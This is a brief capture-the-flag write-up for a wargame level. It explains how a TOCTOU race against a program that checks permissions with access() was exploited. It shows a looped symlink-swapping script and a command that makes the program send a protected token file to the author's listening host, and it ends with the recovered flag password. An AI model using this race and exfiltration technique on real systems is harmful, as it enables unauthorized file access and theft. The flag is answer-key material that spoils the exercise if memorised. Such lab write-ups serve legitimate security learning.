program wants file and ip of the host
./level10 file host
	sends file to host if you have access to it
and listens on port 6969
ltrace showed that program uses access which is a vulnurable way to protect yourprogram

from man:
Warning: Using access() to check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a secu‚Äê
       rity hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.  For this  reason,
       the  use  of  this  system  call  should be avoided.  

i created a ruby server to sit on 6969 port and recieve message

than i created bash script which is constantly creating two sym links:
ln -sf ~/level10 /tmp/exploit
ln -sf ~/token /tmp/exploit


than i launched ./level10 /tmp/exploit ip in infinite loop:
so i needed to get in place where level10 rights were assigned to /tmp/exploit
but content of tmp/exploit was actually ~/token

then i got junk and finally got passwd to flag10: woupa2yuojeeaaed06riuj63c
